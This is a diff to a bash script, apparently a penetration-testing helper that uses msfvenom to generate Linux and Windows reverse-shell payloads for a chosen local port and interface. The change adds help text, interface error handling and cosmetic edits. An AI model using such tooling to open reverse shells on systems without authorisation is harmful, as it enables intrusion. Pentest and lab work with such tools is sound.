@@ -19,6 +19,11 @@ while [[ $# -gt 0 ]]; do
   case $1 in
     -h|--help)
       echo "$0 [-p LPORT] [-i IFACE] [-H HTTP_PORT] [-m lsr64.elf,wsr.c,...]" >&2
+      echo "  -p LPORT  specify local port for reverse shell" >&2
+      echo "  -i IFACE  specify interface to determine IP address, e.g. tun0 or eth0" >&2
+      echo "  -m SHELLTYPE  specify the kind of shell you want to generate, e.g." >&2
+      echo "                lsr64.elf - linux shell reverse 64bit in elf format" >&2
+      echo "                wsr.c     - windows shell reverse 32bit in c format" >&2
       exit 0
       ;;
     -p|--port)
@@ -48,8 +53,12 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-
-ip address show "${iface}" 1>/dev/null || exit 1
+# check the specified interface is valid
+err=$(ip address show "${iface}" 2>&1)
+if [[ "$?" -ne "0" ]]; then
+    echo "Error: ${err} Specify a valid interface with the -i option."
+    exit 1
+fi
 lhost=$(ip address show $iface | grep -oP '(?<=inet )[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
 echo "lhost: $lhost"
 
@@ -72,9 +81,9 @@ do
 done
 
 
-######################################################
-#---------------) msfvenom payloads (----------------#
-######################################################
+###############################################################
+#---------------) generate msfvenom payloads (----------------#
+###############################################################
 if [ -n "$msfvenom" ] && (! [[ -f .last ]] || ! grep -wq ${lhost} .last || ! grep -wq ${lport} .last)
 then
     [[ "${msfvenom}" =~ ^w ]] && os='windows/'
@@ -129,6 +138,7 @@ red=$(tput setaf 1)
 green=$(tput setaf 2)
 yellow=$(tput setaf 190)
 blue=$(tput setaf 4)
+
 printf $yellow; cat $win_tmp | sort | column; printf $nc
 printf $green; cat $lin_tmp | sort | column; printf $nc
 printf $blue; cat $oth_tmp | sort | column; printf $nc
